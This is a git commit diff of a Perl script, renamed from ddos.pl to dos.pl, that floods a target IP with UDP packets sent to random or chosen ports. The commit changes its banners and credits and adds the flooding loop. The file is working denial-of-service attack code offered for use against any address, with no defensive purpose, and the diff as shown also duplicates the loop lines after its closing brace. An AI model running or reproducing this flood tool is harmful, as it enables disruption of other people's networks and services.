c75a2d2c320f203dfa6efc486ca25145d92b5b21
CxllZ <72345758+CxllZ@users.noreply.github.com>
2021-02-06 20:03:22 +0000

    Update and rename ddos.pl to dos.pl

--- dos.pl
+++ dos.pl
@@ -15,6 +15,8 @@
 # ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀                                                                
 #                                                                         
 #
+#####################################################
+# udp flood.
 ######################################################
 
 use Socket;
@@ -42,52 +44,52 @@ my ($ip) = @ARGV;
 
 if ($help || !$ip) {
   print <<'EOL';
- The usage of command is perl ddos.pl 1.1.1.1
+     *         ********
+    ***       **
+  ******     ********
+ ********          **
+**********  ********
+ udp.pl Criado por DarkAcidBurn
+
+ usage:
+ perl dos.pl IP PORT 65500
+
+ 
 EOL
   exit(1);
 }
 
 if ($bw && $delay) {
-  print "WARNING: The package size overrides the parameter --the command will be ignored\n";
+  print "WARNING: computed packet size overwrites the --size parameter ignored\n";
   $size = int($bw * $delay / 8);
 } elsif ($bw) {
   $delay = (8 * $size) / $bw;
 }
 
-$size = 700 if $bw && !$size;
+$size = 256 if $bw && !$size;
 
 ($bw = int($size / $delay * 8)) if ($delay && $size);
 
 my ($iaddr,$endtime,$psize,$pport);
-$iaddr = inet_aton("$ip") or die "Cant resolve the hostname try again $ip\n";
+$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-printf "[0;32m>> Made by CxllZ  \n";
-printf "[0;32m>>  _______  _______  _______          
- ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄  ▄            ▄            ▄▄▄▄▄▄▄▄▄▄▄ 
-▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░▌          ▐░▌          ▐░░░░░░░░░░░▌
-▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌ ▐░▌          ▐░▌           ▀▀▀▀▀▀▀▀▀█░▌
-▐░▌            ▐░▌ ▐░▌  ▐░▌          ▐░▌                    ▐░▌
-▐░▌             ▐░▐░▌   ▐░▌          ▐░▌           ▄▄▄▄▄▄▄▄▄█░▌
-▐░▌              ▐░▌    ▐░▌          ▐░▌          ▐░░░░░░░░░░░▌
-▐░▌             ▐░▌░▌   ▐░▌          ▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ 
-▐░▌            ▐░▌ ▐░▌  ▐░▌          ▐░▌          ▐░▌          
-▐░█▄▄▄▄▄▄▄▄▄  ▐░▌   ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
-▐░░░░░░░░░░░▌▐░▌     ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
- ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
-                                                                 
-                                    \n";
-printf "[0;31m>> hitting the ip    \n";
-printf "[0;36m>> hitting the ports     \n";
-($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
+print "Atacando ip: $ip " . ($port ? $port : "By:") . " DarkAcidBurn " . 
+  ($size ? "$size-byte" : "UDP By: XxASxX") . " Erro 448" . ($time ? " for $time seconds" : "") . "\n";
 print "Interpacket delay $delay msec\n" if $delay;
 print "total IP bandwidth $bw kbps\n" if $bw;
-printf "[1;31m>> Press CTRL+C to stop the attack  \n" unless $time;
+print "Para parar use Ctrl+C\n" unless $time;
 
-die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
+die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
 $size -= 28 if $size;
 for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
+  usleep(1000 * $delay) if $delay;
+}
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
 
